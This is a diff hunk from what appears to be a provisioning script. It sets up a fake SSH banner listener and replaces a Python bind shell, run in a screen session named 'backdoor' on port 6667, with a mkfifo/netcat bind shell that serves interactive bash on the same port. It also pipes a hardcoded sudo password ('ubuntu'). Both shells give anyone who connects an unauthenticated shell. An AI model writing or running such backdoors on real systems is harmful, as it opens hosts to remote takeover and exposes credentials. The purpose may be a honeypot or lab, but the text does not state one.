@@ -282,17 +282,8 @@ echo "ubuntu" | sudo -S killall nc 2>/dev/null
 # 2. Start the persistent listeners in a way that wont hang the script
 echo "ubuntu" | sudo -S screen -d -m bash -c 'while true; do echo "SSH-2.0-OpenSSH_4.3" | nc -l 2222; done'
 
-screen -dmS backdoor python -c '
-import socket,os,subprocess;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);
-s.bind(("0.0.0.0",6667));
-while True:
-    s.listen(1);
-    c,a=s.accept();
-    os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);
-    p=subprocess.call(["/bin/sh","-i"]);
-'
+echo "ubuntu" | sudo -S screen -d -m bash -c 'while true; do mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lk 6667 > /tmp/f; done'
+
 
     EOT
   ]
